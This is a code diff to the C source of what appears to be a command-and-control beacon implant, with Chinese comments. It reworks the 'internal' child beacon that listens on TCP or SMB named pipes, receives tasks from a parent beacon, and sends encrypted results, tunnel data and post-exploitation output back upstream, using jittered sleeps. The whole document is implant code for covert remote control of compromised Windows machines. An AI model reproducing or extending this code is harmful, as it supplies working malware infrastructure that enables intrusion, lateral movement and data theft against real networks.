@@ -2,35 +2,20 @@
 
 #if !defined(BEACON_EXTERNAL_TCP_BUILD)
 
-/* 加密并通过父级 TCP/SMB channel 发送所有出站数据包 */
-static INT FlushOutboxInternal(BeaconContext* ctx, CascadeIo* upstream)
+/* 重连退避默认值：上游未提供等待时长时使用 1 秒兜底，防止 tight reconnect */
+#define INTERNAL_RECONNECT_DEFAULT_DELAY_MS 1000u
+
+/* Internal cascade 发送回调：把 encrypted result 作为 RESULT 帧写到上游 channel。
+ * internal 不收任务响应（任务由独立的 TASK 帧推送），response 始终为空。 */
+static INT InternalSendEncrypted(BeaconContext* ctx, VOID* ctx_sender,
+                                 const ByteBuf* encrypted, ByteBuf* response)
 {
-    OutboxNode* list = OutboxDrain(&ctx->outbox);
-    OutboxNode* cur = list;
+    CascadeIo* upstream = (CascadeIo*)ctx_sender;
 
-    while (cur) {
-        ByteBuf encrypted;
-
-        if (!CryptoEncryptResult(ctx->session_key, sizeof(ctx->session_key), &cur->packet, &encrypted)) {
-            OutboxPushFrontList(&ctx->outbox, cur);
-            return 0;
-        }
-
-        if (!CascadeIoWriteFrame(upstream, CASCADE_FRAME_RESULT, &encrypted)) {
-            BbFree(&encrypted);
-            OutboxPushFrontList(&ctx->outbox, cur);
-            return 0;
-        }
-
-        BbFree(&encrypted);
-
-        {
-            OutboxNode* done = cur;
-            cur = cur->next;
-            OutboxFreeNode(done);
-        }
+    BbInit(response);
+    if (!CascadeIoWriteFrame(upstream, CASCADE_FRAME_RESULT, encrypted)) {
+        return 0;
     }
-
     return 1;
 }
 
@@ -50,6 +35,7 @@ typedef struct InternalRunState {
     CascadeFrameReader frame_reader;
 } InternalRunState;
 
+/* 将父级下发的加密任务包加入内部运行队列。 */
 static VOID InternalQueueTask(InternalRunState* state, ByteBuf* packet)
 {
     InternalInbound* item;
@@ -75,6 +61,7 @@ static VOID InternalQueueTask(InternalRunState* state, ByteBuf* packet)
     SetEvent(state->event);
 }
 
+/* 原子取出当前已排队的父级任务包链表。 */
 static InternalInbound* InternalDrainTasks(InternalRunState* state)
 {
     InternalInbound* list;
@@ -88,6 +75,7 @@ static InternalInbound* InternalDrainTasks(InternalRunState* state)
     return list;
 }
 
+/* 将 TCP/SMB 字节流喂给 cascade frame reader 并处理完整帧。 */
 static INT InternalFeedFrameData(InternalRunState* state, const BYTE8* data, SIZE_T len)
 {
     SIZE_T off = 0;
@@ -119,6 +107,7 @@ static INT InternalFeedFrameData(InternalRunState* state, const BYTE8* data, SIZ
     return 0;
 }
 
+/* 消费非阻塞 TCP socket 上当前可读的数据。 */
 static INT InternalPumpTcp(InternalRunState* state)
 {
     BYTE8 buf[8192];
@@ -139,6 +128,7 @@ static INT InternalPumpTcp(InternalRunState* state)
     }
 }
 
+/* 消费命名管道上的同步/重叠读取结果。 */
 static INT InternalPumpPipe(InternalRunState* state)
 {
     CascadeIo* io = state->upstream;
@@ -169,6 +159,7 @@ static INT InternalPumpPipe(InternalRunState* state)
     }
 }
 
+/* 向父级发送 internal beacon 的初始 HELLO 帧。 */
 static INT SendInternalHello(BeaconContext* ctx, CascadeIo* upstream)
 {
     ByteBuf plain;
@@ -198,6 +189,7 @@ static INT SendInternalHello(BeaconContext* ctx, CascadeIo* upstream)
     return ok;
 }
 
+/* 释放尚未被主循环分发的 pending task。 */
 static VOID InternalFreePending(InternalRunState* state)
 {
     InternalInbound* list = InternalDrainTasks(state);
@@ -210,12 +202,14 @@ static VOID InternalFreePending(InternalRunState* state)
     }
 }
 
+/* 运行一个已建立的 internal TCP/SMB 上游连接。 */
 static INT AgentRunInternal(Agent* agent, CascadeIo* upstream)
 {
     BeaconContext* ctx = &agent->ctx;
     InternalRunState state;
     BOOL is_tcp;
 
+    /* 不同 IO 类型先切换到事件驱动读取模式。 */
     is_tcp = upstream->kind == CASCADE_IO_TCP;
     if (is_tcp) {
         if (!CascadeIoEnableTcpReadEvent(upstream)) {
@@ -229,6 +223,7 @@ static INT AgentRunInternal(Agent* agent, CascadeIo* upstream)
         }
     }
 
+    /* HELLO 必须先发出，父级才能为该 child 建立 channel。 */
     if (!SendInternalHello(ctx, upstream)) {
         CascadeIoClose(upstream);
         return -1;
@@ -242,6 +237,7 @@ static INT AgentRunInternal(Agent* agent, CascadeIo* upstream)
     InitializeCriticalSection(&state.lock);
     CascadeFrameReaderInit(&state.frame_reader);
 
+    /* SMB 管道需要先投递一次 overlapped read。 */
     if (!is_tcp) {
         if (InternalPumpPipe(&state) < 0) {
             CascadeIoClose(upstream);
@@ -265,9 +261,10 @@ static INT AgentRunInternal(Agent* agent, CascadeIo* upstream)
         if (ctx->runtime.wake_event) {
             handles[count++] = ctx->runtime.wake_event;
         }
-        if (wait_ms == 0) wait_ms = 1000;
+        if (wait_ms == 0) wait_ms = INTERNAL_RECONNECT_DEFAULT_DELAY_MS;
         wait_result = BeaconWait(ctx, handles, count, wait_ms);
         if (wait_result == WAIT_OBJECT_0) {
+            /* 上游事件就绪：读取 frame 并把 TASK 入队。 */
             if (is_tcp) {
                 LONG events = 0;
 
@@ -282,6 +279,7 @@ static INT AgentRunInternal(Agent* agent, CascadeIo* upstream)
             break;
         }
 
+        /* 将已收到的父级任务交给普通任务分发器。 */
         list = InternalDrainTasks(&state);
         while (list) {
             InternalInbound* next = list->next;
@@ -291,13 +289,15 @@ static INT AgentRunInternal(Agent* agent, CascadeIo* upstream)
             list = next;
         }
 
+        /* 每个 tick 都轮询异步子系统并 flush result 到父级。 */
         AgentFlushTransfers(ctx);
         AgentFlushTunnels(ctx);
         AgentFlushCascade(ctx);
         AgentFlushPostEx(ctx);
-        if (!FlushOutboxInternal(ctx, upstream)) break;
+        if (!AgentFlushOutbox(ctx, InternalSendEncrypted, upstream)) break;
     }
 
+    /* 连接结束时释放所有本地状态。 */
     InterlockedExchange(&state.active, 0);
     CascadeIoClose(upstream);
     SetEvent(state.event);
@@ -309,6 +309,7 @@ static INT AgentRunInternal(Agent* agent, CascadeIo* upstream)
     return 0;
 }
 
+/* 判断 internal agent 是否仍允许继续监听或重连。 */
 static INT AgentShouldRunInternal(Agent* agent)
 {
     return agent &&
@@ -316,6 +317,7 @@ static INT AgentShouldRunInternal(Agent* agent)
            InterlockedCompareExchange(&agent->stop, 0, 0) == 0;
 }
 
+/* internal child 断开后短暂等待，避免 tight reconnect loop。 */
 static VOID AgentInternalReconnectDelay(Agent* agent)
 {
     HANDLE wake_event;
@@ -330,6 +332,7 @@ static VOID AgentInternalReconnectDelay(Agent* agent)
     }
 }
 
+/* 监听 TCP internal 入口，接受父级连接后交给 AgentRunInternal。 */
 INT AgentRunInternalTcp(Agent* agent)
 {
     INT result = 0;
@@ -363,7 +366,7 @@ INT AgentRunInternalTcp(Agent* agent)
             }
 
             wait_ms = SleepCalculateWithJitter(&agent->ctx.profile);
-            if (wait_ms == 0) wait_ms = 1000;
+            if (wait_ms == 0) wait_ms = INTERNAL_RECONNECT_DEFAULT_DELAY_MS;
             wait_result = BeaconWait(&agent->ctx, handles, count, wait_ms);
             if (wait_result == WAIT_OBJECT_0) {
                 accepted = CascadeTcpAcceptReady(&listener, &upstream);
@@ -384,6 +387,7 @@ INT AgentRunInternalTcp(Agent* agent)
     return result;
 }
 
+/* 监听 SMB internal 入口，接受父级命名管道连接后交给 AgentRunInternal。 */
 INT AgentRunInternalSmb(Agent* agent)
 {
     INT result = 0;
@@ -414,7 +418,7 @@ INT AgentRunInternalSmb(Agent* agent)
             }
 
             wait_ms = SleepCalculateWithJitter(&agent->ctx.profile);
-            if (wait_ms == 0) wait_ms = 1000;
+            if (wait_ms == 0) wait_ms = INTERNAL_RECONNECT_DEFAULT_DELAY_MS;
             wait_result = BeaconWait(&agent->ctx, handles, count, wait_ms);
             if (wait_result == WAIT_OBJECT_0) {
                 accepted = CascadePipeAcceptReady(&listener, &upstream);
